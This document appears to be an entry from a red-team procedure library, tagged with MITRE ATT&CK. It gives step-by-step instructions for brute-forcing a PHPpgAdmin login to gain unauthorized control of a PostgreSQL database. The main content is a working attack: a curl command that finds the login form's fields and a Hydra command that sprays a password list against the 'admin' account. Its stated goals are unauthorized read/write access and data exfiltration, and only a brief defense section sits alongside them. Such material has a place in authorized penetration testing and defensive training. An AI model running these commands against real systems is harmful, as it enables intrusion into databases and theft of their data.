---
tags:
  - brute-force
  - phppgadmin
  - postgresql-access
type: procedure
tools:
  - '[[tools/hydra]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/hydra-bruteforce-phppgadmin]]'
verified: false
platforms:
  - Web
  - PostgreSQL
submitted: true
techniques:
  - '[[Password Spraying]]'
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: a61dec13-dac7-4783-8999-8b75d54368ff
created_at: '2025-12-14T17:24:55.753Z'
updated_at: '2025-12-14T17:24:55.753Z'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Password Spraying]]'
  - '[[Exploit Public-Facing Application]]'
---
# Brute-Force-PHPpgAdmin-for-Database-Access

## Summary

This procedure exploits the absence of rate limiting on the PHPpgAdmin login to brute-force credentials, granting unauthorized access to PostgreSQL database management functions such as querying and modification.

## Description

PHPpgAdmin's default configuration often lacks protections against brute-force attacks, especially when the interface is publicly accessible. Attackers can use credential lists to attempt logins via HTTP POST requests, leading to full database control upon success. This is particularly dangerous in environments with weak default credentials for PostgreSQL admins. Expected outcomes include session hijacking and data exfiltration.

## Requirements

1. Confirmed exposed PHPpgAdmin interface from prior discovery
2. Wordlist of common passwords (e.g., rockyou.txt)
3. Brute-force tool like Hydra
4. Target URL with login endpoint identified

## Defense

Defensive measures and detection strategies:

- Enforce strong, unique passwords and multi-factor authentication (MFA) for database tools
- Implement account lockouts after failed login attempts
- Deploy intrusion detection systems (IDS) to alert on repeated login failures from single IPs

## Objectives

1. Crack PHPpgAdmin credentials via brute-force
2. Establish authenticated session for database operations
3. Achieve unauthorized read/write access to PostgreSQL data

## Instructions

### Step 1: Identify Login Endpoint

**Context**: Confirm the exact POST parameters for the login form to prepare the brute-force attack.

**Command** ([[commands/curl-access-phppgadmin]]):
```bash
curl -s http://target-ip/phppgadmin/login.php | grep -E 'name=|input type="(text|password)"'
```

> This extracts form fields like 'user' and 'pass', ensuring accurate payload for brute-forcing.

### Step 2: Execute Brute-Force Attack

**Context**: Use a password list to spray attempts against the login, exploiting lack of restrictions to find valid credentials quickly.

**Command** ([[commands/hydra-bruteforce-phppgadmin]]):
```bash
hydra -l admin -P /path/to/passwords.txt target-ip http-post-form "/phppgadmin/login.php:user=^USER^&pass=^PASS^:Invalid login" -t 4 -vV
```

> The command tests 'admin' as username with a password list; success is indicated by a valid session or redirect. Adjust 'Invalid login' to match the error message.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Password Spraying]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/hydra-bruteforce-phppgadmin]]
- [[commands/curl-access-phppgadmin]]

## Tools Used

- [[tools/hydra]]

## Tags

- [[brute-force]]
- [[phppgadmin]]
- [[postgresql-access]]
